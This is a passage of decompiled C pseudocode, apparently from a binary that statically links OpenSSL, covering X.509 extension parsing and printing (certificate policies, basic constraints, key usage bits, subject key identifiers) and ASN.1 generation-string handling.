  sub_408310(34, 119, 123, (int)"crypto\\x509v3\\v3_akey.c", 116);
  return 0;
}

//----- (0047D1C0) --------------------------------------------------------
void *sub_47D1C0()
{
  return &unk_523C50;
}

//----- (0047D1D0) --------------------------------------------------------
void *sub_47D1D0()
{
  return &unk_523C94;
}

//----- (0047D1E0) --------------------------------------------------------
void __cdecl sub_47D1E0(int a1)
{
  sub_42FEF0(a1, (int)&unk_523C94);
}

//----- (0047D200) --------------------------------------------------------
void *sub_47D200()
{
  return &unk_523CF4;
}

//----- (0047D210) --------------------------------------------------------
void *sub_47D210()
{
  return &unk_523D38;
}

//----- (0047D220) --------------------------------------------------------
void __cdecl sub_47D220(int a1)
{
  sub_42FEF0(a1, (int)&unk_523D38);
}

//----- (0047D240) --------------------------------------------------------
void *sub_47D240()
{
  return &unk_523D7C;
}

//----- (0047D250) --------------------------------------------------------
void *sub_47D250()
{
  return &unk_523DC0;
}

//----- (0047D260) --------------------------------------------------------
int __usercall sub_47D260@<eax>(int *a1@<ebx>, int *a2@<edi>)
{
  int v2; // esi
  int v3; // eax
  _DWORD *v4; // eax
  int v6; // [esp+0h] [ebp-8h]

  v2 = 0;
  if ( sub_426A30(v6) <= 0 )
    return 1;
  while ( 1 )
  {
    v3 = sub_426A40(a2, v2);
    v4 = sub_44D140(0, *(char **)(v3 + 4));
    if ( !v4 )
    {
      sub_408310(34, 133, 140, (int)"crypto\\x509v3\\v3_cpols.c", 339);
      goto LABEL_8;
    }
    if ( !sub_4269B0(a1, (int)v4) )
      break;
    if ( ++v2 >= sub_426A30((int)a2) )
      return 1;
  }
  sub_408310(34, 133, 65, (int)"crypto\\x509v3\\v3_cpols.c", 348);
LABEL_8:
  sub_426C00(a1, (void (__cdecl *)(_DWORD))sub_432A30);
  return 0;
}
// 47D264: variable 'v6' is possibly undefined

//----- (0047D2F0) --------------------------------------------------------
int __cdecl sub_47D2F0(int a1, int a2, int a3)
{
  int *v3; // ebx
  bool v4; // cc
  const char *v5; // eax
  int i; // esi
  int v7; // edi
  _BYTE *v8; // edi
  int result; // eax

  v3 = *(int **)a2;
  if ( *(_DWORD *)a2 )
  {
    sub_419190(a1, "%*sOrganization: %s\n", a3, byte_4F1291, *(const char **)(*v3 + 8));
    v4 = sub_426A30(v3[1]) <= 1;
    v5 = "s";
    if ( v4 )
      v5 = byte_4F1291;
    sub_419190(a1, "%*sNumber%s: ", a3, byte_4F1291, v5);
    for ( i = 0; i < sub_426A30(v3[1]); ++i )
    {
      v7 = sub_426A40((int *)v3[1], i);
      if ( i )
        sub_4051D0(a1, (int)", ");
      v8 = sub_44D0E0(0, v7);
      sub_4051D0(a1, (int)v8);
      sub_413490(v8);
    }
    sub_4051D0(a1, (int)"\n");
  }
  result = *(_DWORD *)(a2 + 4);
  if ( result )
    return sub_419190(a1, "%*sExplicit Text: %s\n", a3, byte_4F1291, *(const char **)(result + 8));
  return result;
}

//----- (0047D3F0) --------------------------------------------------------
int __cdecl sub_47D3F0(int *a1, int a2)
{
  char ***v2; // esi
  char **v3; // eax
  int *v4; // ebp
  _DWORD *v5; // ebx
  _DWORD *v6; // eax
  const char *v7; // esi
  const char *v8; // edi
  unsigned int v9; // ecx
  int v10; // eax
  int v11; // esi
  int v12; // eax
  void *v13; // eax
  void *v14; // edi
  int v15; // esi
  _DWORD *v16; // eax
  int v18; // [esp+10h] [ebp-8h]
  int v19; // [esp+14h] [ebp-4h]

  v2 = (char ***)sub_42FB20((int)&unk_523D38);
  v19 = (int)v2;
  if ( !v2 )
    goto LABEL_18;
  v3 = sub_423310(0xA5u);
  *v2 = v3;
  if ( !v3 )
  {
    sub_408310(34, 132, 68, (int)"crypto\\x509v3\\v3_cpols.c", 256);
    goto LABEL_31;
  }
  v4 = (int *)sub_42FB20((int)&unk_523D7C);
  if ( !v4 )
  {
LABEL_18:
    sub_408310(34, 132, 65, (int)"crypto\\x509v3\\v3_cpols.c", 322);
    goto LABEL_31;
  }
  v2[1] = (char **)v4;
  v18 = 0;
  if ( sub_426A30((int)a1) > 0 )
  {
    while ( 1 )
    {
      v5 = (_DWORD *)sub_426A40(a1, v18);
      if ( !strcmp((const char *)v5[1], "explicitText") )
        break;
      if ( !strcmp((const char *)v5[1], "organization") )
      {
        v10 = *v4;
        if ( !*v4 )
        {
          v10 = sub_42FB20((int)&unk_523DC0);
          if ( !v10 )
            goto LABEL_18;
          *v4 = v10;
        }
        if ( a2 )
          *(_DWORD *)(*(_DWORD *)v10 + 4) = 22;
        else
          *(_DWORD *)(*(_DWORD *)v10 + 4) = 26;
        v7 = (const char *)v5[2];
        v8 = v7 + 1;
        v9 = (unsigned int)&v7[strlen(v7) + 1];
        v6 = *(_DWORD **)v10;
LABEL_17:
        if ( !sub_432910((int)v6, v7, v9 - (_DWORD)v8) )
          goto LABEL_18;
        goto LABEL_26;
      }
      if ( strcmp((const char *)v5[1], "noticeNumbers") )
      {
        sub_408310(34, 132, 138, (int)"crypto\\x509v3\\v3_cpols.c", 306);
        sub_408610(6, "section:", *v5, ",name:", v5[1], ",value:", v5[2]);
LABEL_31:
        sub_42FEF0(v19, (int)&unk_523D38);
        return 0;
      }
      v11 = *v4;
      if ( !*v4 )
      {
        v12 = sub_42FB20((int)&unk_523DC0);
        v11 = v12;
        if ( !v12 )
          goto LABEL_18;
        *v4 = v12;
      }
      v13 = sub_44D8A0((const char *)v5[2]);
      v14 = v13;
      if ( !v13 || !sub_426A30((int)v13) )
      {
        sub_408310(34, 132, 141, (int)"crypto\\x509v3\\v3_cpols.c", 296);
        sub_408610(6, "section:", *v5, ",name:", v5[1], ",value:", v5[2]);
        sub_426C00(v14, (void (__cdecl *)(_DWORD))sub_44D000);
        goto LABEL_31;
      }
      v15 = sub_47D260(*(int **)(v11 + 4), (int *)v14);
      sub_426C00(v14, (void (__cdecl *)(_DWORD))sub_44D000);
      if ( !v15 )
        goto LABEL_31;
LABEL_26:
      if ( ++v18 >= sub_426A30((int)a1) )
        goto LABEL_27;
    }
    v6 = sub_42C560();
    v4[1] = (int)v6;
    if ( !v6 )
      goto LABEL_18;
    v7 = (const char *)v5[2];
    v8 = v7 + 1;
    v9 = (unsigned int)&v7[strlen(v7) + 1];
    goto LABEL_17;
  }
LABEL_27:
  v16 = (_DWORD *)*v4;
  if ( *v4 && (!v16[1] || !*v16) )
  {
    sub_408310(34, 132, 142, (int)"crypto\\x509v3\\v3_cpols.c", 315);
    goto LABEL_31;
  }
  return v19;
}

//----- (0047D730) --------------------------------------------------------
int __usercall sub_47D730@<eax>(int a1@<ebx>, int a2@<esi>, int *a3)
{
  int v3; // ebp
  int result; // eax
  int *v5; // edi
  int v6; // eax

  v3 = 0;
  result = sub_426A30((int)a3);
  if ( result > 0 )
  {
    do
    {
      v5 = (int *)sub_426A40(a3, v3);
      v6 = sub_423680(*v5) - 164;
      if ( v6 )
      {
        if ( v6 == 1 )
        {
          sub_419190(a2, "%*sUser Notice:\n", a1, byte_4F1291);
          sub_47D2F0(a2, v5[1], a1 + 2);
        }
        else
        {
          sub_419190(a2, "%*sUnknown Qualifier: ", a1 + 2, byte_4F1291);
          sub_422A00(a2, *v5);
          sub_4051D0(a2, (int)"\n");
        }
      }
      else
      {
        sub_419190(a2, "%*sCPS: %s\n", a1, byte_4F1291, *(const char **)(v5[1] + 8));
      }
      ++v3;
      result = sub_426A30((int)a3);
    }
    while ( v3 < result );
  }
  return result;
}

//----- (0047D800) --------------------------------------------------------
int __cdecl sub_47D800(int a1, int *a2, int a3)
{
  int v3; // ebx
  int i; // ebp
  int v5; // edi
  char **v6; // eax
  char ***v7; // esi
  char **v8; // eax
  char **v9; // eax
  int v10; // eax
  int *v11; // eax
  int v12; // esi
  int v13; // edi

  v3 = sub_42FB20((int)&unk_523C94);
  if ( v3 )
  {
    for ( i = 0; i < sub_426A30((int)a2); ++i )
    {
      v5 = sub_426A40(a2, i);
      if ( !strcmp(*(const char **)(v5 + 4), "policyIdentifier") )
      {
        v6 = sub_423C60(*(char **)(v5 + 8), 0);
        if ( !v6 )
        {
          sub_408310(34, 131, 110, (int)"crypto\\x509v3\\v3_cpols.c", 177);
LABEL_27:
          sub_408610(6, "section:", *(_DWORD *)v5, ",name:", *(_DWORD *)(v5 + 4), ",value:", *(_DWORD *)(v5 + 8));
          goto LABEL_25;
        }
        *(_DWORD *)v3 = v6;
      }
      else
      {
        if ( sub_44D6A0(*(char **)(v5 + 4), "CPS") )
        {
          if ( sub_44D6A0(*(char **)(v5 + 4), "userNotice") )
          {
            sub_408310(34, 131, 138, (int)"crypto\\x509v3\\v3_cpols.c", 223);
            goto LABEL_27;
          }
          if ( **(_BYTE **)(v5 + 8) != 64 )
          {
            sub_408310(34, 131, 137, (int)"crypto\\x509v3\\v3_cpols.c", 203);
            goto LABEL_27;
          }
          v11 = (int *)sub_44DE80(a1);
          v12 = (int)v11;
          if ( !v11 )
          {
            sub_408310(34, 131, 135, (int)"crypto\\x509v3\\v3_cpols.c", 209);
            goto LABEL_27;
          }
          v13 = sub_47D3F0(v11, a3);
          sub_44DEC0(a1, v12);
          if ( !v13 )
            goto LABEL_25;
          if ( !*(_DWORD *)(v3 + 4) )
            *(_DWORD *)(v3 + 4) = sub_426AF0();
          v10 = sub_4269B0(*(int **)(v3 + 4), v13);
        }
        else
        {
          if ( !*(_DWORD *)(v3 + 4) )
            *(_DWORD *)(v3 + 4) = sub_426AF0();
          v7 = (char ***)sub_42FB20((int)&unk_523D38);
          if ( !v7 || !sub_4269B0(*(int **)(v3 + 4), (int)v7) )
            goto LABEL_31;
          v8 = sub_423310(0xA4u);
          *v7 = v8;
          if ( !v8 )
          {
            sub_408310(34, 131, 68, (int)"crypto\\x509v3\\v3_cpols.c", 191);
            goto LABEL_25;
          }
          v9 = (char **)sub_42C520();
          v7[1] = v9;
          if ( !v9 )
            goto LABEL_31;
          v10 = sub_432910((int)v9, *(const char **)(v5 + 8), strlen(*(const char **)(v5 + 8)));
        }
        if ( !v10 )
          goto LABEL_31;
      }
    }
    if ( !*(_DWORD *)v3 )
    {
      sub_408310(34, 131, 139, (int)"crypto\\x509v3\\v3_cpols.c", 230);
      goto LABEL_25;
    }
    return v3;
  }
  else
  {
LABEL_31:
    sub_408310(34, 131, 65, (int)"crypto\\x509v3\\v3_cpols.c", 237);
LABEL_25:
    sub_42FEF0(v3, (int)&unk_523C94);
    return 0;
  }
}

//----- (0047DAA0) --------------------------------------------------------
int __cdecl sub_47DAA0(int a1, int *a2, int a3, int a4)
{
  int i; // ebp
  int *v5; // edi
  int *v6; // edi

  for ( i = 0; i < sub_426A30((int)a2); ++i )
  {
    v5 = (int *)sub_426A40(a2, i);
    sub_419190(a3, "%*sPolicy: ", a4, byte_4F1291);
    sub_422A00(a3, *v5);
    sub_4051D0(a3, (int)"\n");
    v6 = (int *)v5[1];
    if ( v6 )
      sub_47D730(a4 + 2, a3, v6);
  }
  return 1;
}

//----- (0047DB30) --------------------------------------------------------
int *__cdecl sub_47DB30(int a1, int a2, const char *Src)
{
  void *v4; // eax
  void *v5; // edi
  int v6; // eax
  _DWORD *v7; // ebx
  char *v8; // esi
  int *v9; // eax
  int v10; // edi
  int v11; // esi
  void **v12; // edi
  void ***v13; // eax
  void *v14; // [esp+4h] [ebp-10h]
  int v15; // [esp+8h] [ebp-Ch]
  int *Block; // [esp+Ch] [ebp-8h]
  int v17; // [esp+10h] [ebp-4h]

  Block = sub_426AF0();
  if ( !Block )
  {
    sub_408310(34, 130, 65, (int)"crypto\\x509v3\\v3_cpols.c", 98);
    return 0;
  }
  v4 = sub_44D8A0(Src);
  v5 = v4;
  v14 = v4;
  if ( v4 )
  {
    v17 = 0;
    v15 = 0;
    if ( sub_426A30((int)v4) <= 0 )
    {
LABEL_20:
      sub_426C00(v5, (void (__cdecl *)(_DWORD))sub_44D000);
      return Block;
    }
    while ( 1 )
    {
      v6 = sub_426A40((int *)v5, v15);
      v7 = (_DWORD *)v6;
      if ( *(_DWORD *)(v6 + 8) )
        break;
      v8 = *(char **)(v6 + 4);
      if ( !v8 )
        break;
      if ( !strcmp(*(const char **)(v6 + 4), "ia5org") )
      {
        v17 = 1;
      }
      else
      {
        if ( *v8 == 64 )
        {
          v9 = (int *)sub_44DE80(a2);
          v10 = (int)v9;
          if ( !v9 )
          {
            sub_408310(34, 130, 135, (int)"crypto\\x509v3\\v3_cpols.c", 123);
LABEL_22:
            sub_408610(6, "section:", *v7, ",name:", v7[1], ",value:", v7[2]);
LABEL_25:
            v5 = v14;
            goto LABEL_26;
          }
          v11 = sub_47D800(a2, v9, v17);
          sub_44DEC0(a2, v10);
          if ( !v11 )
            goto LABEL_25;
        }
        else
        {
          v12 = (void **)sub_423C60(v8, 0);
          if ( !v12 )
          {
            sub_408310(34, 130, 110, (int)"crypto\\x509v3\\v3_cpols.c", 135);
            goto LABEL_22;
          }
          v13 = (void ***)sub_42FB20((int)&unk_523C94);
          v11 = (int)v13;
          if ( !v13 )
          {
            sub_408310(34, 130, 65, (int)"crypto\\x509v3\\v3_cpols.c", 141);
            sub_422B70(v12);
            goto LABEL_25;
          }
          *v13 = v12;
        }
        if ( !sub_4269B0(Block, v11) )
        {
          sub_47D1E0(v11);
          sub_408310(34, 130, 65, (int)"crypto\\x509v3\\v3_cpols.c", 149);
          goto LABEL_25;
        }
        v5 = v14;
      }
      if ( ++v15 >= sub_426A30((int)v5) )
        goto LABEL_20;
    }
    sub_408310(34, 130, 134, (int)"crypto\\x509v3\\v3_cpols.c", 111);
    sub_408610(6, "section:", *v7, ",name:", v7[1], ",value:", v7[2]);
  }
  else
  {
    sub_408310(34, 130, 34, (int)"crypto\\x509v3\\v3_cpols.c", 103);
  }
LABEL_26:
  sub_426C00(v5, (void (__cdecl *)(_DWORD))sub_44D000);
  sub_426C00(Block, sub_47D1E0);
  return 0;
}

//----- (0047DDE0) --------------------------------------------------------
void *sub_47DDE0()
{
  return &unk_523F40;
}

//----- (0047DDF0) --------------------------------------------------------
void __cdecl sub_47DDF0(int a1)
{
  sub_42FEF0(a1, (int)&unk_523F40);
}

//----- (0047DE10) --------------------------------------------------------
int __cdecl sub_47DE10(int a1, int a2, int a3)
{
  sub_44D050("CA", *(void **)a2, (int **)&a3);
  sub_44D280("pathlen", *(_DWORD *)(a2 + 4), (int **)&a3);
  return a3;
}

//----- (0047DE50) --------------------------------------------------------
_DWORD *__cdecl sub_47DE50(int a1, int a2, int *a3)
{
  _DWORD *v3; // esi
  int v5; // ebx
  int v6; // edi
  int v7; // eax

  v3 = (_DWORD *)sub_42FB20((int)&unk_523F40);
  if ( !v3 )
  {
    sub_408310(34, 102, 65, (int)"crypto\\x509v3\\v3_bcons.c", 63);
    return 0;
  }
  v5 = 0;
  if ( sub_426A30((int)a3) <= 0 )
    return v3;
  while ( 1 )
  {
    v6 = sub_426A40(a3, v5);
    if ( !strcmp(*(const char **)(v6 + 4), "CA") )
    {
      v7 = sub_44D2D0(v6, v3);
      goto LABEL_8;
    }
    if ( strcmp(*(const char **)(v6 + 4), "pathlen") )
      break;
    v7 = sub_44D5C0(v6, v3 + 1);
LABEL_8:
    if ( !v7 )
      goto LABEL_12;
    if ( ++v5 >= sub_426A30((int)a3) )
      return v3;
  }
  sub_408310(34, 102, 106, (int)"crypto\\x509v3\\v3_bcons.c", 75);
  sub_408610(6, "section:", *(_DWORD *)v6, ",name:", *(_DWORD *)(v6 + 4), ",value:", *(_DWORD *)(v6 + 8));
LABEL_12:
  sub_42FEF0((int)v3, (int)&unk_523F40);
  return 0;
}

//----- (0047DFB0) --------------------------------------------------------
void *sub_47DFB0()
{
  return &unk_523FF0;
}

//----- (0047DFC0) --------------------------------------------------------
int __cdecl sub_47DFC0(int a1, int **a2, int a3, int a4)
{
  sub_419190(a3, "%*s", a4, byte_4F1291);
  if ( *a2 )
  {
    sub_405110(a3, (int)"Not Before: ", 12);
    sub_44C2C0(a3, *a2);
    if ( !a2[1] )
      return 1;
    sub_405110(a3, (int)", ", 2);
  }
  if ( a2[1] )
  {
    sub_405110(a3, (int)"Not After: ", 11);
    sub_44C2C0(a3, a2[1]);
  }
  return 1;
}

//----- (0047E040) --------------------------------------------------------
int __cdecl sub_47E040(int a1, _DWORD *a2, int a3)
{
  int i; // esi

  for ( i = *(_DWORD *)(a1 + 52); *(_DWORD *)(i + 4); i += 12 )
  {
    if ( sub_4379A0(a2, *(_DWORD *)i) )
      sub_44CF10(*(const char **)(i + 4), 0, (int **)&a3);
  }
  return a3;
}

//----- (0047E090) --------------------------------------------------------
_DWORD *__cdecl sub_47E090(int a1, int a2, int a3)
{
  _DWORD *v3; // edi
  int *v5; // esi
  int v6; // ebp
  _DWORD *v7; // edi
  int v8; // esi
  const char *v9; // eax
  const char *v10; // edi
  void *Block; // [esp+4h] [ebp-8h]
  _DWORD *v12; // [esp+8h] [ebp-4h]

  v3 = sub_42C4E0();
  Block = v3;
  if ( v3 )
  {
    v5 = (int *)a3;
    v6 = 0;
    if ( sub_426A30(a3) <= 0 )
    {
      return v3;
    }
    else
    {
      while ( 1 )
      {
        v7 = (_DWORD *)sub_426A40(v5, v6);
        v8 = *(_DWORD *)(a1 + 52);
        v9 = *(const char **)(v8 + 4);
        v12 = v7;
        if ( v9 )
          break;
LABEL_12:
        if ( !*(_DWORD *)(v8 + 4) )
        {
          sub_408310(34, 101, 111, (int)"crypto\\x509v3\\v3_bitst.c", 86);
          sub_408610(6, "section:", *v7, ",name:", v7[1], ",value:", v7[2]);
          sub_42C4F0(Block);
          return 0;
        }
        v5 = (int *)a3;
        if ( ++v6 >= sub_426A30(a3) )
          return Block;
      }
      v10 = (const char *)v7[1];
      while ( strcmp(*(const char **)(v8 + 8), v10) && strcmp(v9, v10) )
      {
        v9 = *(const char **)(v8 + 16);
        v8 += 12;
        if ( !v9 )
          goto LABEL_11;
      }
      if ( sub_4378A0((signed int *)Block, *(_DWORD *)v8, 1) )
      {
LABEL_11:
        v7 = v12;
        goto LABEL_12;
      }
      sub_408310(34, 101, 65, (int)"crypto\\x509v3\\v3_bitst.c", 77);
      sub_42C4F0(Block);
      return 0;
    }
  }
  else
  {
    sub_408310(34, 101, 65, (int)"crypto\\x509v3\\v3_bitst.c", 67);
    return 0;
  }
}

//----- (0047E230) --------------------------------------------------------
_BYTE *__cdecl sub_47E230(int a1, int a2)
{
  return sub_424B40(*(_BYTE **)(a2 + 8), *(_DWORD *)a2);
}

//----- (0047E250) --------------------------------------------------------
_DWORD *__cdecl sub_47E250(int a1, int a2, const char *a3)
{
  _DWORD *v3; // esi
  void *v5; // eax
  int v6; // [esp+4h] [ebp-4h] BYREF

  v3 = sub_42C430();
  if ( v3 )
  {
    v5 = sub_424A20(a3, &v6);
    v3[2] = v5;
    if ( v5 )
    {
      *v3 = v6;
      return v3;
    }
    else
    {
      sub_42C4F0(v3);
      return 0;
    }
  }
  else
  {
    sub_408310(34, 112, 65, (int)"crypto\\x509v3\\v3_skey.c", 40);
    return 0;
  }
}

//----- (0047E2C0) --------------------------------------------------------
_DWORD *__cdecl sub_47E2C0(int a1, _DWORD *a2, const char *a3)
{
  _DWORD *result; // eax
  void *v4; // esi
  int v5; // eax
  int v6; // eax
  int *v7; // eax
  int v8; // [esp+8h] [ebp-50h] BYREF
  size_t Size; // [esp+Ch] [ebp-4Ch] BYREF
  int v10; // [esp+10h] [ebp-48h] BYREF
  char Src[64]; // [esp+14h] [ebp-44h] BYREF

  if ( strcmp(a3, "hash") )
    return sub_47E250(a1, (int)a2, a3);
  result = sub_42C430();
  v4 = result;
  if ( !result )
  {
    sub_408310(34, 115, 65, (int)"crypto\\x509v3\\v3_skey.c", 69);
    return 0;
  }
  if ( !a2 )
    goto LABEL_17;
  if ( *a2 == 1 )
    return result;
  v5 = a2[3];
  if ( !v5 )
  {
    if ( a2[2] )
    {
      v6 = *(_DWORD *)(a2[2] + 44);
      goto LABEL_11;
    }
LABEL_17:
    sub_408310(34, 115, 114, (int)"crypto\\x509v3\\v3_skey.c", 77);
    goto LABEL_18;
  }
  v6 = *(_DWORD *)(v5 + 20);
LABEL_11:
  if ( v6 )
  {
    sub_41D550(0, &v8, &v10, 0, v6);
    v7 = (int *)sub_42BEA0();
    if ( sub_42BC10(v8, v10, (int)Src, &Size, v7, 0) )
    {
      if ( sub_437A10((int)v4, Src, Size) )
        return v4;
      sub_408310(34, 115, 65, (int)"crypto\\x509v3\\v3_skey.c", 97);
    }
  }
  else
  {
    sub_408310(34, 115, 114, (int)"crypto\\x509v3\\v3_skey.c", 87);
  }
LABEL_18:
  sub_42C4F0(v4);
  return 0;
}
// 47E385: conditional instruction was optimized away because eax.4==0

//----- (0047E440) --------------------------------------------------------
void *__cdecl sub_47E440(int a1, int a2)
{
  void *v2; // esi

  if ( !a2 || !*(_DWORD *)a2 )
    return 0;
  v2 = sub_4133F0(*(_DWORD *)a2 + 1);
  if ( v2 )
  {
    memcpy(v2, *(const void **)(a2 + 8), *(_DWORD *)a2);
    *((_BYTE *)v2 + *(_DWORD *)a2) = 0;
    return v2;
  }
  else
  {
    sub_408310(34, 149, 65, (int)"crypto\\x509v3\\v3_ia5.c", 35);
    return 0;
  }
}

//----- (0047E4B0) --------------------------------------------------------
_DWORD *__cdecl sub_47E4B0(int a1, int a2, const char *Src)
{
  _DWORD *v4; // esi

  if ( Src )
  {
    v4 = sub_42C520();
    if ( v4 )
    {
      if ( sub_432910((int)v4, Src, strlen(Src)) )
      {
        return v4;
      }
      else
      {
        sub_42C4F0(v4);
        return 0;
      }
    }
    else
    {
      sub_408310(34, 100, 65, (int)"crypto\\x509v3\\v3_ia5.c", 63);
      return 0;
    }
  }
  else
  {
    sub_408310(34, 100, 107, (int)"crypto\\x509v3\\v3_ia5.c", 49);
    return 0;
  }
}

//----- (0047E540) --------------------------------------------------------
int __usercall sub_47E540@<eax>(const char *a1@<edx>, int a2@<ecx>, _DWORD *a3@<ebx>, signed int *a4)
{
  signed int v6; // eax
  char *v7; // ecx
  int result; // eax
  char v9; // cl
  char v10[4]; // [esp+8h] [ebp-8h] BYREF
  char *EndPtr; // [esp+Ch] [ebp-4h] BYREF

  if ( !a1 )
    return 0;
  v6 = strtoul(a1, &EndPtr, 10);
  v7 = EndPtr;
  if ( EndPtr )
  {
    if ( *EndPtr && EndPtr > &a1[a2] )
      return 0;
  }
  if ( v6 < 0 )
  {
    sub_408310(13, 182, 187, (int)"crypto\\asn1\\asn1_gen.c", 360);
    return 0;
  }
  *a4 = v6;
  if ( v7 && a1 - v7 + a2 )
  {
    v9 = *v7;
    switch ( v9 )
    {
      case 'A':
        *a3 = 64;
        result = 1;
        break;
      case 'C':
        goto LABEL_15;
      case 'P':
        *a3 = 192;
        result = 1;
        break;
      case 'U':
        *a3 = 0;
        result = 1;
        break;
      default:
        v10[0] = v9;
        v10[1] = 0;
        sub_408310(13, 182, 186, (int)"crypto\\asn1\\asn1_gen.c", 391);
        sub_408610(2, "Char=", v10);
        result = 0;
        break;
    }
  }
  else
  {
LABEL_15:
    *a3 = 128;
    return 1;
  }
  return result;
}

//----- (0047E690) --------------------------------------------------------
int __cdecl sub_47E690(int *a1, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v8; // esi
  int *v9; // ecx
  int v10; // edx

  v6 = *a1;
  if ( *a1 == -1 || a6 )
  {
    v8 = a1[105];
    if ( v8 == 20 )
    {
      sub_408310(13, 176, 174, (int)"crypto\\asn1\\asn1_gen.c", 477);
      return 0;
    }
    else
    {
      v9 = &a1[5 * v8 + 5];
      a1[105] = v8 + 1;
      if ( v6 == -1 )
      {
        *v9 = a2;
        v9[1] = a3;
        v10 = a5;
      }
      else
      {
        *v9 = v6;
        v9[1] = a1[1];
        v10 = a5;
        *a1 = -1;
        a1[1] = -1;
      }
      v9[2] = a4;
      v9[3] = v10;
      return 1;
    }
  }
  else
  {
    sub_408310(13, 176, 179, (int)"crypto\\asn1\\asn1_gen.c", 472);
    return 0;
  }
}

//----- (0047E750) --------------------------------------------------------
int __usercall sub_47E750@<eax>(size_t MaxCount@<ecx>, const char *a2@<ebx>)
{
  size_t v2; // edi
  char **v3; // eax
  unsigned int v4; // esi

  v2 = MaxCount;
  if ( MaxCount == -1 )
    v2 = strlen(a2);
  v3 = &off_5245A0;
  dword_53933C = (int)&off_5245A0;
  v4 = 0;
  while ( (char *)v2 != v3[1] )
  {
LABEL_7:
    ++v4;
    v3 += 3;
    dword_53933C = (int)v3;
    if ( v4 >= 0x31 )
      return -1;
  }
  if ( strncmp(*v3, a2, v2) )
  {
    v3 = (char **)dword_53933C;
    goto LABEL_7;
  }
  return *(_DWORD *)(dword_53933C + 8);
}
// 5245A0: using guessed type char *off_5245A0;
// 53933C: using guessed type int dword_53933C;

//----- (0047E7C0) --------------------------------------------------------
int __cdecl sub_47E7C0(char *String, int a2, signed int *a3)
{
  char *v3; // esi
  int v4; // eax

  v3 = String;
  if ( !String )
    return 0;
  v4 = strtoul(String, &String, 10);
  if ( String )
  {
    if ( *String && String != &v3[a2] )
      return 0;
  }
  if ( v4 < 0 )
  {
    sub_408310(13, 180, 187, (int)"crypto\\asn1\\asn1_gen.c", 755);
    return 0;
  }
  if ( sub_4378A0(a3, v4, 1) )
    return 1;
  sub_408310(13, 180, 65, (int)"crypto\\asn1\\asn1_gen.c", 759);
  return 0;
}

//----- (0047E850) --------------------------------------------------------
int __cdecl sub_47E850(char *Str1, size_t MaxCount, _DWORD *a3)
{
  int v4; // eax
  int v5; // eax

  if ( !Str1 )
    return 0;
  if ( MaxCount == 3 && !strncmp(Str1, off_52480C, 3u) )
  {
    *a3 |= 0x2906u;
    return 1;
  }
  else
  {
    v4 = sub_47E750(MaxCount, Str1);
    if ( v4 && (v4 & 0x10000) == 0 && (v5 = sub_42D2F0(v4)) != 0 )
    {
      *a3 |= v5;
      return 1;
    }
    else
    {
      return 0;
    }
  }
}

//----- (0047E8C0) --------------------------------------------------------
int __cdecl sub_47E8C0(char *Str, _DWORD *a2)
{
  *a2 = 0;
  return sub_441130(Str, 124, 1, (int (__cdecl *)(char *, int, int))sub_47E850, (int)a2);
}

//----- (0047E8F0) --------------------------------------------------------
int __cdecl sub_47E8F0(const char *a1, signed int MaxCount, signed int *a3)
{
  const char *v3; // ebx
  int v4; // ebp
  const char *v5; // edi
  size_t v7; // esi
  signed int v8; // ecx
  const char *v9; // eax
  int v10; // eax
  signed int *v11; // ecx
  int v12; // eax
  signed int v13; // ecx
  const char **v14; // eax
  int v15; // edx
  int v16; // [esp-18h] [ebp-28h]
  int v17; // [esp-10h] [ebp-20h]
  int v18; // [esp-8h] [ebp-18h]
  int v19; // [esp+Ch] [ebp-4h] BYREF

  v3 = a1;
  v4 = 0;
  v5 = 0;
  if ( !a1 )
    return -1;
  v7 = MaxCount;
  v8 = 0;
  v9 = a1;
  if ( MaxCount > 0 )
  {
    while ( *v9 != 58 )
    {
      ++v8;
      ++v9;
      if ( v8 >= MaxCount )
        goto LABEL_8;
    }
    v5 = v9 + 1;
    v4 = MaxCount + a1 - (v9 + 1);
    v7 = v9 - a1;
  }
LABEL_8:
  v10 = sub_47E750(v7, a1);
  if ( v10 == -1 )
  {
    sub_408310(13, 177, 194, (int)"crypto\\asn1\\asn1_gen.c", 266);
    sub_408610(2, "tag=", v3);
    return -1;
  }
  if ( (v10 & 0x10000) != 0 )
  {
    switch ( v10 )
    {
      case 65537:
        if ( *a3 != -1 )
        {
          sub_408310(13, 177, 181, (int)"crypto\\asn1\\asn1_gen.c", 288);
          return -1;
        }
        v12 = sub_47E540(v5, v4, a3 + 1, a3);
        goto LABEL_32;
      case 65538:
        if ( !sub_47E540(v5, v4, &v19, (signed int *)&a1) )
          return -1;
        if ( *a3 == -1 )
        {
          v13 = a3[105];
          if ( v13 != 20 )
          {
            v14 = (const char **)&a3[5 * v13 + 5];
            a3[105] = v13 + 1;
            v15 = v19;
            *v14 = a1;
            v14[1] = (const char *)v15;
            v14[2] = (const char *)1;
            v14[3] = 0;
            return 1;
          }
          sub_408310(13, 176, 174, (int)"crypto\\asn1\\asn1_gen.c", 477);
        }
        else
        {
          sub_408310(13, 176, 179, (int)"crypto\\asn1\\asn1_gen.c", 472);
        }
        return -1;
      case 65540:
        v12 = sub_47E690(a3, 3, 0, 0, 1, 1);
        goto LABEL_32;
      case 65541:
        v17 = 0;
        v16 = 4;
        goto LABEL_31;
      case 65542:
        v17 = 1;
        v16 = 16;
LABEL_31:
        v12 = sub_47E690(a3, v16, 0, v17, 0, 1);
        goto LABEL_32;
      case 65543:
        v12 = sub_47E690(a3, 17, 0, 1, 0, 1);
LABEL_32:
        if ( v12 )
          return 1;
        return -1;
      case 65544:
        if ( v5 )
        {
          if ( !strncmp(v5, "ASCII", 5u) )
          {
            a3[3] = 1;
            return 1;
          }
          if ( !strncmp(v5, "UTF8", 4u) )
          {
            a3[3] = 2;
            return 1;
          }
          if ( !strncmp(v5, "HEX", 3u) )
          {
            a3[3] = 3;
            return 1;
          }
          if ( !strncmp(v5, "BITLIST", 7u) )
          {
            a3[3] = 4;
            return 1;
          }
          v18 = 337;
        }
        else
        {
          v18 = 325;
        }
        sub_408310(13, 177, 160, (int)"crypto\\asn1\\asn1_gen.c", v18);
        return -1;
      default:
        return 1;
    }
  }
  v11 = a3;
  a3[2] = v10;
  v11[4] = (signed int)v5;
  if ( v5 || !v3[v7] )
    return 0;
  sub_408310(13, 177, 189, (int)"crypto\\asn1\\asn1_gen.c", 277);
  return -1;
}

//----- (0047EBF0) --------------------------------------------------------
unsigned int *__cdecl sub_47EBF0(int a1, unsigned int a2)
{
  char *v2; // ecx
  char *v3; // edi
  unsigned int *v4; // esi
  _DWORD *v6; // eax
  char **v7; // eax
  _DWORD *v8; // eax
  int v9; // ebp
